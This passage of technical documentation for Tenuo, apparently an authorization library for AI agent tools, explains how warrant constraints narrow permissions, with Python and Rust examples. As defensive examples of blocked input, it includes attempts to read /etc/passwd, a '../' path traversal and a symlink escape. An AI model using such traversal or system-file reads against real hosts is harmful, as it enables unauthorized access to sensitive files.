| `Cidr("10.0.0.0/8")` | `Cidr("10.1.0.0/16")` | Child is subnet of parent |
| `UrlPattern("https://*.example.com/*")` | `Exact("https://api.example.com/v1")` | Child URL matches parent pattern |
| `UrlPattern("https://*.example.com/*")` | `UrlPattern("https://api.example.com/v1/*")` | Child pattern is narrower |
| `OneOf(["a","b","c"])` | `Exact("b")` | Child value is in parent set |
| `OneOf(["a","b","c"])` | `NotOneOf(["c"])` | Carves holes (allows `a`, `b`) |

#### Special Rules

| Rule | Description |
|------|-------------|
| `Wildcard` parent | Contains ANY child constraint type |
| `Wildcard` child | NEVER allowed (would widen permissions) |
| `Regex` -> `Regex` | Must be IDENTICAL pattern (subset undecidable) |
| `Range` inclusivity | Exclusive bounds cannot become inclusive at same value |

---

## Limits

To ensure system stability and prevent denial-of-service attacks, the following hard limits are enforced:

- **Max Constraint Depth**: **32 levels**. (e.g. `Not(Not(...))` nested 32 times).
- **Max Constraint Size**: Generally bounded by the 64KB Max Warrant Size.

For most use cases, depth 32 is more than sufficient. Generated policies from automated systems should respect this limit.


**Examples:**

```python
# Wildcard -> Anything: Wildcard is the universal parent
parent = Wildcard()
child = Pattern("staging-*")  # OK - Wildcard contains everything
child = Range(min=0, max=100)         # OK - even different types
child = Wildcard()            # OK - Wildcard contains Wildcard

# Nothing -> Wildcard: would expand permissions
parent = Pattern("*")
child = Wildcard()  # FAILS - cannot widen to Wildcard

# Pattern -> Exact: exact value must match the pattern
parent = Pattern("*@company.com")
child = Exact("cfo@company.com")  # OK - matches pattern

# Regex -> Exact: exact value must match the regex
parent = Regex(r"^dev-.*$")
child = Exact("dev-web")  # OK - matches regex
child = Exact("production")   # FAILS - doesn't match

# Regex -> Regex: must be identical (subset is undecidable)
parent = Regex(r"^staging-.*$")
child = Regex(r"^staging-.*$")      # OK - identical
child = Regex(r"^staging-web$")     # FAILS - even if semantically narrower

# Range -> Exact: numeric value must be within range
parent = Range(min=0, max=100)
child = Exact("50")   # OK - 50 is in [0, 100]
child = Exact("150")  # FAILS - 150 > 100

# OneOf -> Exact: exact value must be in the set
parent = OneOf(["read", "write", "delete"])
child = Exact("read")  # OK - "read" is in set

# OneOf -> NotOneOf: carve holes from allowed set
parent = OneOf(["staging", "production", "dev"])
child = NotOneOf(["production"])  # OK - allows staging, dev only

# NotOneOf -> NotOneOf: must exclude MORE values
parent = NotOneOf(["admin"])
child = NotOneOf(["admin", "root"])  # OK - excludes more

# Contains -> Contains: must require MORE values
parent = Contains(["read"])
child = Contains(["read", "write"])  # OK - requires more

# Subset -> Subset: must allow FEWER values
parent = Subset(["a", "b", "c"])
child = Subset(["a", "b"])  # OK - allows fewer
```

#### Incompatible Cross-Types
- `Pattern` -> `Range`: String matching vs numeric bounds  
- `OneOf` -> `Pattern`: Set membership vs glob matching
- Any type -> `Wildcard`: Would expand permissions

### Pattern Narrowing

```python
from tenuo import Warrant, Pattern

# Parent: /data/*
parent = (Warrant.mint_builder()
    .capability("read_file", path=Pattern("/data/*"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# Child: /data/reports/* (narrower) - OK
child = (parent.grant_builder()
    .capability("read_file", path=Pattern("/data/reports/*"))
    .grant(key))

# Child: /* (wider) - FAILS
child = (parent.grant_builder()
    .capability("read_file", path=Pattern("/*"))
    .grant(key))  # MonotonicityViolation
```

### Range Narrowing

```python
from tenuo import Warrant, Range

# Parent: max 15 replicas
parent = (Warrant.mint_builder()
    .capability("scale", replicas=Range.max_value(15))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# Child: max 10 (narrower) - OK
child = (parent.grant_builder()
    .capability("scale", replicas=Range.max_value(10))
    .grant(key))

# Child: max 20 (wider) - FAILS
child = (parent.grant_builder()
    .capability("scale", replicas=Range.max_value(20))
    .grant(key))  # MonotonicityViolation
```

### OneOf Narrowing

```python
from tenuo import Warrant, OneOf

# Parent: ["a", "b", "c"]
parent = (Warrant.mint_builder()
    .capability("action", type=OneOf(["a", "b", "c"]))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# Child: ["a", "b"] (subset) - OK
child = (parent.grant_builder()
    .capability("action", type=OneOf(["a", "b"]))
    .grant(key))

# Child: ["a", "b", "d"] (adds "d") - FAILS
child = (parent.grant_builder()
    .capability("action", type=OneOf(["a", "b", "d"]))
    .grant(key))  # MonotonicityViolation
```

### Regex Narrowing

**Regex constraints are conservative**: Child regex must have **identical pattern** to parent.

```python
from tenuo import Warrant, Regex, Exact

# Parent: regex pattern
parent = (Warrant.mint_builder()
    .capability("query", env=Regex(r"^(staging|dev)-.*$"))
    .holder(key.public_key)
    .ttl(3600)
    .mint(key))

# Cannot narrow to different regex (even if provably narrower) - FAILS
child = (parent.grant_builder()
    .capability("query", env=Regex(r"^staging-.*$"))
    .grant(key))  # MonotonicityViolation

# Can keep same pattern - OK
child = (parent.grant_builder()
    .capability("query", env=Regex(r"^(staging|dev)-.*$"))
    .grant(key))

# Can narrow to Exact (if it matches parent regex) - OK
child = (parent.grant_builder()
    .capability("query", env=Exact("staging-web"))
    .grant(key))
```

**Why**: Determining if one regex is a subset of another is undecidable in general. Tenuo takes a conservative approach for security.

**Recommendation**: Use `Pattern()` for simple matching that needs attenuation, or `Exact()` for specific values.

---

## Using Constraints with Tools

### With @guard Decorator

```python
from tenuo import guard, Pattern, Range

@guard(tool="transfer_money")
def transfer_money(account: str, amount: float):
    # Tenuo checks: 
    # - "account" against any Pattern/Exact constraint
    # - "amount" against any Range constraint
    ...
```

### With guard()

```python
from tenuo.langchain import guard

# Protect tools with bound warrant
protected = guard([read_file, write_file, delete_file], bound)
```

---

## Common Patterns

### Wildcard to Specific Constraints

```python
# Parent: any query
async with mint(Capability("search", query=Wildcard())):
    # Child: narrow to pattern
    async with grant(Capability("search", query=Pattern("*public*"))):
        await search(query="public data")  # OK
```

### File Path Constraints

```python
# Read-only access to reports directory
async with mint(Capability("read_file", path=Subpath("/data/reports"))):
    await read_file(path="/data/reports/q3.csv")  # OK
    await read_file(path="/etc/passwd")           # FAILS
```

### Replica/Capacity Limits

```python
# Limit replica counts
async with mint(Capability("scale", replicas=Range.max_value(15))):
    await scale(replicas=5)   # OK
    await scale(replicas=20)  # FAILS
```

### Environment Restrictions

```python
# Only staging and dev
async with mint(Capability("deploy", env=OneOf(["staging", "dev"]))):
    await deploy(env="staging")    # OK
    await deploy(env="production") # FAILS
```

### Scoped Database Access

```python
# Only specific tables
async with mint(Capability("query", table=OneOf(["users", "orders"]))):
    await query(table="users")   # OK
    await query(table="secrets") # FAILS
```

---

## Pattern Best Practices

### Pattern Uses Glob Syntax, Not Regex

`Pattern` uses **glob syntax** (like shell wildcards), not regular expressions:

| Syntax | Meaning | Example |
|--------|---------|---------|
| `*` | Match any characters | `staging-*` → `staging-web` |
| `?` | Match single character | `env-?` → `env-a` |
| `[abc]` | Character class | `[abc].txt` → `a.txt` |
| `{a,b}` | Alternation | `{dev,staging}-*` → `dev-web` |

**Common mistakes:**
```python
# ❌ WRONG: Pipe is not OR in glob
Pattern("weather *|news *")  # Treats | as literal character

# ✅ CORRECT: Use curly braces for alternation
Pattern("{weather,news} *")

# ✅ CORRECT: Or use AnyOf() for complex cases
AnyOf([Pattern("weather *"), Pattern("news *")])
```

### Prefer Explicit Over Permissive

```python
# ⚠️ Too permissive - matches everything
Pattern("*")

# ✅ Better - explicit prefix
Pattern("staging-*")

# ✅ Best for known values - use Exact or OneOf
Exact("staging-web")
OneOf(["staging-web", "staging-db"])
```

### Keep Patterns Simple

Attenuation validation works best with simple prefix/suffix patterns:

```python
# ✅ Simple prefix - attenuation works reliably
Pattern("/data/*")           # Parent
Pattern("/data/reports/*")   # Child (narrower) ✓

# ⚠️ Complex patterns - attenuation may be conservative
Pattern("*-{prod,staging}-*")  # Harder to validate containment
```

### Use Exact/OneOf for High-Security Cases

When precision matters more than flexibility:

```python
# For known, enumerable values
OneOf(["read", "write", "delete"])

# For exact matches
Exact("/etc/passwd")  # Only this exact path

# For IP ranges
Cidr("10.0.0.0/8")
```

---

## Defense in Depth: File Paths

Tenuo constraints validate the **logical policy** (does the pattern allow this path?). For file operations, you should also validate the **physical path** to prevent symlink attacks and traversal.

### The One-Two Punch

```rust
use path_jail;

// Step 1: Tenuo validates policy
if warrant.allows("read_file", &args) {
    // Step 2: path_jail validates filesystem reality
    let safe_path = path_jail::join("/data", &args.path)?;
    std::fs::read_to_string(safe_path)?
}
```

### Why Both?

| Layer | What it catches | Example |
|-------|-----------------|---------|
| **Tenuo** (Pattern) | Policy violations | `path="/etc/passwd"` blocked by `Pattern("/data/*")` |
| **path_jail** | Traversal attacks | `path="/data/../etc/passwd"` blocked after normalization |
| **path_jail** | Symlink escapes | `path="/data/link"` where link → `/etc` |

### Recommended Pattern

```python
from path_jail import Jail  # pip install path_jail

jail = Jail("/data")

@guard(tool="read_file")
async def read_file(path: str) -> str:
    # Tenuo already validated the constraint
    # Now validate the actual filesystem path
    safe_path = jail.join(path)
    return safe_path.read_text()
```

**Tenuo** defines the rules. **path_jail** enforces them on the filesystem.

See: [path_jail on PyPI](https://pypi.org/project/path-jail/)

---

## See Also

- [🔬 Explorer Playground](https://tenuo.dev/explorer/) — Test constraints interactively
- [AI Agent Patterns](./ai-agents) — P-LLM/Q-LLM, prompt injection defense
- [API Reference](./api-reference) — Full constraint API
- [Security](./security) — How constraints fit into the security model
- [LangGraph Integration](./langgraph) — Using constraints with LangGraph
